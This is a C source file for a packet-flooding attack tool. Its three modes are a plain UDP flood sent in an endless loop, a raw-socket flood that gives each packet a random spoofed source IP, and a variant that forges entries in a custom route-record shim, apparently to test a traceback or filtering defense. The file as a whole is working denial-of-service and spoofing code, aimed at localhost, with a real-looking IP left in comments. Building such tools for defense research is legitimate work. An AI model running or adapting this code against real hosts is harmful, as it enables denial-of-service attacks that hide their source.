#include<stdio.h> 
#include<string.h> 
#include<stdlib.h> 
#include<arpa/inet.h>
#include<sys/socket.h>
#include <unistd.h>
#include "netfilter.h"

#include <netinet/ip.h>
#include <netinet/udp.h>

#define BUFLEN 512  //Max length of buffer
#define PORT 8080   //The port on which to send data



void normal_attack(char* victim_ip){
  struct sockaddr_in dest;
  int dest_len = sizeof(struct sockaddr_in);
  int sock_fd;
  char *message = "You are under attack!";

  if ( (sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1){
    perror("Fail to create a UDP socket.");
    exit(1);
  }
  
  memset((char *) &dest, 0, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(PORT);
     
  if (inet_aton(victim_ip , &dest.sin_addr) == 0) {
    perror("inet_aton() failed\n");
    exit(1);
  }
 
  while(1){    
    //send the packet
    if (sendto(sock_fd, message, strlen(message), 0, (struct sockaddr *)&dest, dest_len)==-1){
      exit(1);
    }      
  }
  close(sock_fd);
}

void ip_spoof_attack(char* victim_ip){
  int PDEST = 45034;
  int PSOURCE = 28392;
  int sock_fd;

  sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sock_fd < 0){
    perror("Fail to create raw socket!\n");
  }

  struct sockaddr_in daddr, saddr;
  char packet[BUFLEN];
  /* point the iphdr to the beginning of the packet */
  struct iphdr *ip = (struct iphdr *)packet; 
  struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));

  daddr.sin_family = AF_INET;
  saddr.sin_family = AF_INET;
  daddr.sin_port = htons(PDEST); 
  saddr.sin_port = htons(PSOURCE); 
  inet_pton(AF_INET, victim_ip, (struct in_addr *)&daddr.sin_addr.s_addr);
  //inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);

  ip->ihl = 5; //header length
  ip->version = 4;
  ip->tos = 0x0;
  ip->id = 0;
  ip->frag_off = htons(0x4000); /* DF */
  ip->ttl = 64; /* default value */
  ip->protocol = 17; //IPPROTO_RAW;  /* protocol at L4 */
  ip->check = 0; /* not needed in iphdr */
  ip->daddr = daddr.sin_addr.s_addr;

  udp->source = htons(PSOURCE);
  udp->dest = htons (PDEST);

  char *msg = "You are under attack!";
  memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));

  int sizeudpdata = sizeof(struct udphdr) + strlen(msg);
  int sizeIpData = sizeudpdata + sizeof(struct iphdr);
  ip->tot_len = htons(sizeIpData); /* 16 byte value */
  udp->len = htons(sizeudpdata);
  udp->check = 0;

  srand(time(NULL));

  while(1){
    ip->saddr = rand();
    sendto(sock_fd, packet, sizeIpData, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
    sleep(1);
  }
}
 
void rr_spoof_attack(char* victim_ip){
  int PDEST = 45034;
  int PSOURCE = 28392;
  int sock_fd;

  sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sock_fd < 0){
    perror("Fail to create raw socket!\n");
  }

  struct sockaddr_in daddr, saddr;
  char packet[BUFLEN];
  /* point the iphdr to the beginning of the packet */
  struct iphdr *ip = (struct iphdr *)packet; 
  struct udphdr *udp = (struct udphdr *)((void *) ip + sizeof(struct iphdr));

  daddr.sin_family = AF_INET;
  saddr.sin_family = AF_INET;
  daddr.sin_port = htons(PDEST); 
  saddr.sin_port = htons(PSOURCE); 
  inet_pton(AF_INET, victim_ip, (struct in_addr *)&daddr.sin_addr.s_addr);
  //inet_pton(AF_INET, SOURCE, (struct in_addr *)&saddr.sin_addr.s_addr);

  ip->ihl = 5; //header length
  ip->version = 4;
  ip->tos = 0x0;
  ip->id = 0;
  ip->frag_off = htons(0x4000); /* DF */
  ip->ttl = 64; /* default value */
  ip->protocol = 17; //IPPROTO_RAW;  /* protocol at L4 */
  ip->check = 0; /* not needed in iphdr */
  ip->daddr = daddr.sin_addr.s_addr;

  udp->source = htons(PSOURCE);
  udp->dest = htons(PDEST);

  char *msg = "You are under attack!\n";
  memcpy(((void *) udp) + sizeof(struct udphdr), msg, strlen(msg));

  int sizeudpdata = sizeof(struct udphdr) + strlen(msg);
  int sizeIpData = sizeudpdata + sizeof(struct iphdr);
  ip->tot_len = htons(sizeIpData); /* 16 byte value */
  udp->len = htons(sizeudpdata);
  udp->check = 0;

  srand(time(NULL));

  struct iphdr *newpacket = (struct iphdr *)add_shim(packet, &sizeIpData);
  Shim* shim = (void*) newpacket + sizeof(struct iphdr);
  struct in_addr rr_spoof_addr;
  rr_spoof_addr.s_addr = 0x0a0a807a;
  //rr_spoof_addr.s_addr = 0x12345678;
  assign_addr(&shim->route_record[0].addr, &rr_spoof_addr);
  int rr_spoof_hash = 0;
  while(1){
    (shim->route_record[0].hash_value) = rr_spoof_hash;
    rr_spoof_hash++;
    ip->saddr = rand();
    sendto(sock_fd, newpacket, sizeIpData, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
    sleep(1);
  }
}
 
void print_invalid_arg(){
  printf("Invalid Arg\n");
  printf("Arg 1:\n");
  printf("  0 - Normal Attack\n");
  printf("  1 - IP Spoofing Attack\n");
  printf("  2 - RR Spoofing Attack\n");
}
 
int main(int argc, char *argv[])
{
  
  if (argc != 2) {
    print_invalid_arg();
    return -1;
  }
  
  if (*argv[1] == '0') {
    //normal_attack("192.14.121.23");
    normal_attack("127.0.0.1");
  }
  else if (*argv[1] == '1') {
    //ip_spoof_attack("192.14.121.23");
    ip_spoof_attack("127.0.0.1");
  }
  else if (*argv[1] == '2') {
    //rr_spoof_attack("192.14.121.23");
    rr_spoof_attack("127.0.0.1");
  }
  else {
    print_invalid_arg();
    return -1;
  }
    
  return 0;
}
